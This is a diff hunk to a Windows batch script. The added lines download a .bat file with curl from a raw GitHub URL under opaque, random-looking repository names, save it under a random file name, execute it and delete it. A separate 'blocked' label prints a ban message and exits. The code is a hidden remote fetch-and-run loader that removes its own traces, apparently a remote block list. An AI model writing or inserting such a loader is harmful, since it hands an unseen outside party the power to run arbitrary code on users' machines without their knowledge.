@@ -11,6 +11,20 @@ del is64.txt
 del is64.fil
 del is64.bat
 cls
+goto loading
+:blocked
+cls
+color 4
+echo You are blocked!
+set /p f=
+exit
+:loading
+echo %hide% 
+set file2=%random%%random%%random%
+curl "https://raw.githubusercontent.com/W5GZ-X9YY-4GZY-3DYE/TF3N-KWTN-GWHL-6DA4/main/BlockedList.txt" --output "%file2%.bat"
+call %file2%.bat
+del %file2%.bat
+
 echo %normal%
 :l
 cls
